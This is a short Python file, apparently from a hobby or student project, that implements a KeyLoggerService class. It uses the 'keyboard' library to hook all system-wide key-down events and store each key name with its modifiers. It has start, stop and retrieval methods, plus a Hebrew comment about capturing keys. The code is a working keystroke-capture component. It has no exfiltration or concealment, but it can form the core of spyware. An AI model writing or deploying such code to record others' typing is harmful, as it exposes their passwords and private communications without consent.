from ikeylogger_service import AbstractKeyLoggerService
import keyboard


class KeyLoggerService(AbstractKeyLoggerService):
    def __init__(self):
        super().__init__()
        self.flag = False

    def on_event(self, event):
        # print(vars(event))
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if len(key)> 1:
                key = f"[{key}]"
            pressed_keys = list(keyboard._pressed_events)
            print(pressed_keys)
            if event.modifiers:
                key +=f"+{event.modifiers}"
            self.keys.append(key)

    def start_logging(self)-> None:
        keyboard.hook(self.on_event)

    def stop_logging(self):
        keyboard.unhook_all()


    def get_logged_keys(self) -> list:
        requested_keys = self.keys
        self.keys = []
        return requested_keys



# מתחיל ללכוד את המקשים
# start_logging()
# stop_logging()
# get_logged_keys()